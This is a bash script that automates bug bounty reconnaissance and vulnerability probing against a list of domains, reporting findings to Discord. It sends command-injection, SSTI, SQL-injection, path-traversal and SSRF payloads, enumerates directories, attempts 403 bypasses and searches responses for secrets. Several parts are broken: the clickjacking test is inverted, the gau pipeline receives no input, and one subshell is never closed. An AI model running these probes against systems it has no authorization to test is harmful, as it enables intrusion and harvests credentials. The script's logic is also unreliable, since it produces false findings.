#!/bin/bash

# This script automates various bug bounty tasks, including: 
# 1. subdomain discovery: Uses subfinder and updates allmydomains.txt and notifies my discord of new SDs.
# 2. WAF w/ wafw00f, CNAME, IP and SUBDOMAIN TAKEOVER w/ subover saved to "chk.txt" and notified discord of any SD Takeovers. BE SURE TO CONFIGURE THE YAML FILE FOR NOTIFY
# 3. Updates Nuclei, CHK PATH TO TEMPLATES [Hard coded into script] > output saved in nuclei.txt. Notifies discord of any Med or High findings.
# 4. Chk for Vulnerabilities in all DOMAINS/SUBDOMAINS. **NEED TO ADD TO THIS AS LEARN NEW EXPLOITS TO LOOK FOR. Saves to "chk.txt" 
   #a. nmap for clickjacking. 
   #b. curl for Command Injection.
   #c. curl for SSTI.
   #d. curl for SQLi.  
# 5. Directory ENUM using gobuster and PATH TO rft-large-directories.txt. Output filtered for only 200,300,301,401,403,500 and saved to gobusterdirs_$domain.txt  
# 6. File ENUM using gobuster and PATH TO rft-large-files.txt. Output filtered for only 200,300,301,401,403,500 and saved to gobusterfiles_$domain.txt   
# 7. Conines all found subdomains, directories and files into one file to conduct DEEPER vulnerability tests:
   #a. Gxss -c 100 -o xss.txt  >Output in xss.txt
   #b. SQL testing with gf     >Output in sql.txt
   #c. Checks only links with 403 code with 403bypasser.py. NOTE: currently using PATH python3 ~/403bypasser/403bypasser.py Output saved to 403bypass.txt.
   #d. Looks for secrets in all JS files: uses PATH python3 ~/secretfinder/SecretFinder.py and output saved in secrets.txt
# 8. Search for keywords in ALL responses to URLs in the combined file. UPDATE THIS AS LEARN. Output saved in "chk.txt".
#9. GAU search -
   #a. greps for sensitive files > saved in gausensitive.txt
   #b. XSS using Gxss > gauxss.txt
   #c. path traversal > gautrav.txt
   #d. SSRF using qsreplace and interactsh-client > gaussrf.txt       
   #e. JS Secrets using SecretFinder > gaujssecrets.txt. Chk PATH FOR SecretFinder 
   #f. Finds list of 401s > gau401.txt   
   #g. Finds list of 403s > gau403.txt 
   #h. Admin Panels > gaupanels.txt
   #i. List of PARAMS > gauparams.txt     
   #j. Links that can be tested for IDOR > gauidor.txt
   #k. Searches for and outputs gau-third-party-assets.txt
   #l. Searches for and outputs gau-emails-usersnames.txt
   #m. Searches for and outputs error messages to errors.txt
#10. 403 Bypass testing on gau403.txt > output appended to 403bypass.txt
#========================================================================================  
    
# Function to send a notification to Discord
send_discord_notification() {
    local message="$1"
    echo "$message" | notify --silent
}

# Function to handle errors
handle_error() {
    local message="$1"
    echo "Error: $message" >&2
    send_discord_notification "Error: $message"
    exit 1
}

# Function to search for keywords in a given URL
search_keywords() {
    url=$1
    content=$(curl -s "$url")  # Fetching content using curl (silent mode)
    
     # Keywords to search for
    keywords=("api/" "/api" "password=" "pwd" "secret" "key" "token" "passwd" "admin" "swagger" "Heroku" "slack" "ftp" "jdbc" "sql" "secret jet" "gcp" "htaccess" ".env" ".git" "access" "xml" ".git" "index" "aws_access_key" "aws_secret_key" "api key" "passwd" "pwd" "heroku" "slack" "firebase" "swagger" "aws_secret_key" "aws key" "password" "ftp password" "jdbc" "db" "sql" "secret jet" "config" "admin" "pwd" "json" "gcp" "htaccess" ".env" "ssh key" ".git" "access key" "secret token" "oauth_token" "oauth_token_secret")

    if [ -n "$content" ]; then
        for keyword in "${keywords[@]}"; do
            # Use grep to find the keyword and capture the surrounding context
            context=$(echo "$content" | grep -io -E ".{0,10}$keyword.{0,10}")
            if [ -n "$context" ]; then
                echo "Context: $context, Keyword: $keyword, URL: $url" >> keyword.txt
            fi
        done
    fi
}

# Function to check for vulnerabilities using curl
check_vulnerabilities() {
    local domain="$1"

    # Run nmap with the http-headers script to check for clickjacking
    nmap_result=$(nmap --script http-headers -p 80,443 "$domain" | grep -q "X-Frame-Options: SAMEORIGIN" && echo "clickjack Vulnerability found" || echo "No clickjack vulnerability found")
        if [ "$nmap_result" == "clickjack Vulnerability found" ]; then
            echo "Clickjacking vulnerability found on $domain" >> "chk.txt"
        fi
    
    # Check for command injection
    response_command_injection=$(curl -s "$domain" -d "input=; ls /")
    if [[ "$response_command_injection" == *"bin"* ]]; then
        echo "Potential command injection vulnerability found on $domain..." >> "chk.txt"
    fi

    # Check for Server-Side Template Injection (SSTI)
    response_ssti=$(curl -s "$domain" -d "input={{7*7}}")
    if [[ "$response_ssti" == *"49"* ]]; then
        echo "Potential SSTI found on $domain..." >> "chk.txt"
    fi 

    # Check for SQL injection
    response_sql_injection=$(curl -s "$domain" -d "input=' OR '1'='1'; -- ")
    if [[ "$response_sql_injection" == *"You have an error in your SQL syntax"* ]]; then
        echo "Potential SQL injection vulnerability found on $domain" >> "chk.txt"
    fi
}

# Function to test for subdomain takeover using subover
test_for_subdomain_takeover() {
    local domain="$1"
    local subover_result=$(subover -l "$domain" | grep "Vulnerable")

    if [ -n "$subover_result" ]; then
        echo "Subdomain takeover vulnerability found on $domain..." >> "chk.txt"
        send_discord_notification "Subdomain takeover vulnerability found on $domain"
    fi
}

# Function to test for WAF using wafw00f
test_for_waf() {
    local domain="$1"
    local waf_result=$(wafw00f "$domain")

    if [[ "$waf_result" == *"No WAF detected by fingerprinting"* ]]; then
        echo "No WAF detected on $domain..." >> "chk.txt"
    else
        echo "WAF detected on $domain: $waf_result" >> "chk.txt"
    fi
}

# Function to check if a command-line tool is available
check_dependency() {
    local command_name="$1"
    if ! command -v "$command_name" &> /dev/null; then
        handle_error "$command_name is not installed. Please install it before running the script."
    fi
}

# Dependency checks
check_dependency "subfinder"
check_dependency "nuclei"
check_dependency "gobuster"
check_dependency "curl"
check_dependency "nmap"
check_dependency "notify"
check_dependency "Gxss"
check_dependency "gf"
check_dependency "python3"

# Check if reconftw is installed and executable
if [ ! -x ~/reconftw/reconftw.sh ]; then
    handle_error "reconftw is not installed or not executable. Please install it before running the script."
fi

# Check if gau is installed
command -v gau >/dev/null 2>&1 || { 
    echo >&2 "gau is not installed. Please install it and make sure it's in your PATH.";
    exit 1;
}

# Check if httpx is installed
command -v httpx >/dev/null 2>&1 || { 
    echo >&2 "httpx is not installed. Please install it and make sure it's in your PATH.";
    exit 1;
}

# Check if qsreplace is installed
command -v qsreplace >/dev/null 2>&1 || { 
    echo >&2 "qsreplace is not installed. Please install it and make sure it's in your PATH.";
    exit 1;
}

# Check if interactsh-client is installed
command -v interactsh-client >/dev/null 2>&1 || { 
    echo >&2 "interactsh-client is not installed. Please install it and make sure it's in your PATH.";
    exit 1;
}

# Check if SecretFinder.py is installed
command -v SecretFinder.py >/dev/null 2>&1 || { 
    echo >&2 "SecretFinder.py is not installed. Please install it and adjust the path in the script.";
    exit 1;
}

# Check if subover is installed
check_dependency "subover"

#======================================================================================
#=====START HERE: Prompt user for the input text file with domains=====
read -p "Enter the input allmydomains.txt: " input_file
if [ ! -e "$input_file" ]; then
    echo "Error: The specified input file does not exist."
    exit 1
fi

# Prompt the user about proxying through Burp Suite
read -p "Do you want to proxy gau through Burp Suite? (y/n). If y, turn Burp on NOW and when it is fully open, resume! (y/n): " proxy_choice

if [ "$proxy_choice" == "y" ] || [ "$proxy_choice" == "Y" ]; then
    # Burp Suite proxy settings
    read -p "Enter Burp Suite proxy address and port (e.g., http://localhost:8080): " burp_proxy
    export HTTP_PROXY="$burp_proxy"
    proxy_option="--proxy $burp_proxy"
fi

# Prompt the user to verify notify configuration
read -p "Have you configured the 'notify' tool to send messages to your Discord channel? (y/n): " notify_configured
if [ "$notify_configured" != "y" ] && [ "$notify_configured" != "Y" ]; then
    handle_error "Please configure the 'notify' tool before running the script."
fi

# Create a directory with the current date
output_directory="$(date "+%Y-%m-%d")"
mkdir -p "$output_directory"

    sed -i 's/^https:\/\///' "$input_file" #remove https://
    
# Prompt user for the frequency of script execution
read -p "Enter the wait period in days to repeat the script: " frequency_days

echo "Starting jonautobug.sh for $(date "+%Y-%m-%d")" | notify --silent

echo "Starting subfinder..."
while true; do
  # Subfinder 
    while IFS= read -r domain; do
        subfinder -d "$domain" | sort -u >> updateddomains.txt
    done < "$input_file"
    sed -i 's/^https:\/\///' updateddomains.txt #remove https://

  # NOTIFY DISCORD OF ALL NEW SDs...
    cat updateddomains.txt | httpx -mc 200,300,301,401,403,500 | anew "$input_file" | notify --silent

    rm updateddomains.txt
    
    echo "BELOW YOU WILL FIND OUTPUT FROM WAF, CNAME, DIG, SD Takeover, Vulnerability Tests for Clickjacking, Command Injection, SSTI, SQLi..." >> "chk.txt"
    echo >> "chk.txt"
    
  # Test for WAF
    echo "WAF Tests" >> "chk.txt"
    while IFS= read -r domain; do
        test_for_waf "$domain"
    done < "$input_file"

    echo >> "$response_file"
    echo "CNAME TEST" >> "chk.txt"
  # Retrieve and Save CNAME Records
    echo "Retrieving CNAME Records for all SDs..."
    while IFS= read -r subdomain; do
        cname=$(dig +short "$subdomain" CNAME)
        echo "$subdomain: $cname" >> "chk.txt"
    done < "$input_file"
    echo "CNAME Records saved to chk.txt"

    echo >> "chk.txt"
    echo "DIG FOR IPs" >> "chk.txt"
  # Retrieve and Save IP Addresses
    echo "Retrieving IP Addresses..."
    while IFS= read -r subdomain; do
        ip=$(dig +short "$subdomain" A)
        echo "$subdomain: $ip" >> "chk.txt" 
    done < "$input_file"
    echo "IP Addresses saved to output.txt"

    echo >> "chk.txt"
    echo "SD TAKEOVER" >> "chk.txt"
  # Test for subdomain takeover
    while IFS= read -r domain; do
        test_for_subdomain_takeover "$domain"
    done < "$input_file"

  # Nuclei 
    nuclei -update-templates

    while IFS= read -r domain; do
        echo "Scanning $domain with Nuclei and default templates..."
        nuclei -target "$domain" -t ~/nuclei-templates/ -o nuclei.txt

        # Notify on medium or high findings
        if grep -i -q -E 'medium|high' "nuclei.txt"; then
            send_discord_notification "Medium or high vulnerabilities found on $domain"
        fi
    done < "$input_file"  
    
 # Check for vulnerabilities in all subdomains Clickjacking, Command Injection, SSTI, SQLi 
        echo >> "chk.txt"
        echo "Vulnerabilities TESTS" >> "chk.txt"
    while IFS= read -r domain; do
        check_vulnerabilities "$domain" "chk.txt"
        echo >> "chk.txt"
    done < "$input_file"  

  echo "=======END=======" >> "chk.txt"
  
  # Directory Enumeration
    echo "Directory Enumeration..." 

    while IFS= read -r domain; do
    echo "Running gobuster on $domain..."
        gobuster dir -u "$domain" -w ~/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobusterdirs_$domain.txt -s 200,300,301,401,403,500
    done < "$input_file" 
    
# File Enumeration
    echo "File Enumeration..." 

    while IFS= read -r domain; do
        gobuster dir -u "$domain" -w ~/SecLists/Discovery/Web-Content/raft-large-files.txt -o gobusterfiles_$domain.txt  -s 200,300,301,401,403,500
    done < "$input_file" 

# Combine allmydomains, directories and files found and remove duplicates
    echo "Combining all files for deeper tests..."
    cat "$input_file" gobusterdir_*.txt gobusterfiles_*.txt | sort -u > combined_files.txt 
     
# XSS testing with Gxss
    echo "Testing for XSS vulnerabilities..."
    Gxss -c 100 -o xss.txt < combined_files.txt

# SQL testing with gf
    echo "Testing for SQL vulnerabilities..."
    cat combined_files.txt | gf sql > sql.txt

# 403 Bypass testing
    echo "Testing for 403 Bypass vulnerabilities..."
    httpx -l combined_files.txt -mc 403 | anew 403s.txt
    python3 ~/403bypasser/403bypasser.py -U 403s.txt > 403bypass.txt
    rm 403s.txt

# JS file testing with SecretFinder.py
    echo "Testing for secrets in JS files..."
    grep -i "\.js$" combined_files.txt > jsfiless.txt
    while read -r link; do
        python3 ~/secretfinder/SecretFinder.py -i "$link"
    done < jsfiless.txt > secrets.txt
    rm jsfiless.txt 
  
# Search for keywords in ALL responses to URLs in the combined file
  echo "FOUND KEYWORDS..." >> keyword.txt 
  while IFS= read -r domain; do
    search_keywords "$domain"
  done < combined_files.txt

  rm combined_files.txt

# GAU. 
  while IFS= read -r domain; do
    echo "Running gau on $domain..."

    # Run gau on the current domain
       gau "$domain" $proxy_option >> gauallurls.txt | \
tee >(grep '\.xls$|\.xlsx$|\.sql$|\.csv$|\.env$|\.msql$|\.bak$|\.bkp$|\.bkf$|\.old$|\.temp$|\.db$|\.mdb$|\.config$|\.yaml$|\.zip$|\.tar$|\.git$|\.xz$|\.asmx$|\.vcf$|\.pem$|\.log$|\.bak$|\.bak1$|\.backup$|\.old$|\.swp$|\.~$|\.orig$|\.copy$|\.back$|\.save$|\.zip$' | sort | uniq >> gausensitive.txt) \
    >(grep -i "root\| internal\| private\|secret" | sort | uniq >> gausensitive.txt) \
    >(Gxss -c 50 | grep -iE '<|\"|>' >> gauxss.txt) \
    >(grep '=' | httpx -match '/../../../../../../etc/passwd' >> gautrav.txt) \
    >(qsreplace 'http://interact.sh' | httpx -silent -status-code -no-color -threads 20 >> gaussrf.txt) \
    >(grep '\.js$' | xargs -I {} bash -c "python3 ~/secretfinder/SecretFinder.py -i {}" >> gaujssecrets.txt) \
    >(grep -E '401' | cut -d ' ' -f2 >> gau401.txt) \
    >(grep -E '403' | cut -d ' ' -f2 >> gau403.txt) \
    >(grep -E 'admin|login|dashboard' | sort -u >> gaupanels.txt) \
    >(grep -i "login\|singup\|admin\|dashboard\|wp-admin\|singin\|adminer\|dana-na\|login/?next/=" | sort | uniq >> gaupanels.txt \  
    >(grep -oP '\?\K[^&?]+' gauallurls.txt | sort -u >> gauparams.txt) \
    >(grep -E '/\d+/|/user/\d+' gauallurls.txt | sort -u >> gauidor.txt) \
    >(grep -i "jira\|jenkins\|grafana\|mailman\|+CSCOE+\|+CSCOT+\|+CSCOCA+\|symfony\|graphql\|debug\|gitlab\|phpmyadmin\|phpMyAdmin" | sort | uniq > gau-third-party-assets.txt) \
    >(grep "@" | sort | uniq > gau-emails-usersnames.txt) \
    >(grep "error." | sort | uniq >> errors.txt)

   done < "$input_file"

# 403 Bypass testing
    echo "Testing for 403 Bypass on GAU 403s..."
    python3 ~/403bypasser/403bypasser.py -U gau403.txt >> 403bypass.txt

# Reset the HTTP_PROXY environment variable if it was set
if [ -n "$HTTP_PROXY" ]; then
    unset HTTP_PROXY
fi

rm gauallurls.txt

# Save outputs to a directory defined by the date the script was ran
    mv "chk.txt" "$output_directory/"
    mv "nuclei.txt" "$output_directory/"
    mv "gobusterdirs_"*".txt" "$output_directory/"
    mv "gobusterfiles_"*".txt" "$output_directory/"
    mv "xss.txt" "$output_directory/"
    mv "sql.txt" "$output_directory/"
    mv "403bypass.txt" "$output_directory/"
    mv "secrets.txt" "$output_directory/"
    mv "keyword.txt" "$output_directory/"
    mv "gau403.txt" "$output_directory/"
    mv "errors.txt" "$output_directory/"
    mv "gau-emails-usersnames.txt" "$output_directory/"
    mv "gau-third-party-assets.txt" "$output_directory/"
    mv "gauidor.txt" "$output_directory/"
    mv "gauparams.txt" "$output_directory/"
    mv "gaupanels.txt" "$output_directory/"
    mv "gau401.txt" "$output_directory/"
    mv "gaujssecrets.txt" "$output_directory/"
    mv "gaussrf.txt" "$output_directory/" 
    mv "gautrav.txt" "$output_directory/"
    mv "gauxss.txt" "$output_directory/"
    mv "gausensitive.txt" "$output_directory/"

# Execute Reconftw
    ~/reconftw/./reconftw.sh -l "$input_file" -a

# Notify the end of the scan for the day
    send_discord_notification "Scan complete for today... All files saved in directory $(date "+%Y-%m-%d"). Also look at reconftw results..."
   
   echo "Scan complete for today... All files saved in directory $(date "+%Y-%m-%d"). Also look at reconftw results...Now SLEEPING"
   
    # Sleep for the specified frequency in days
    sleep "$((frequency_days * 86400))"
done
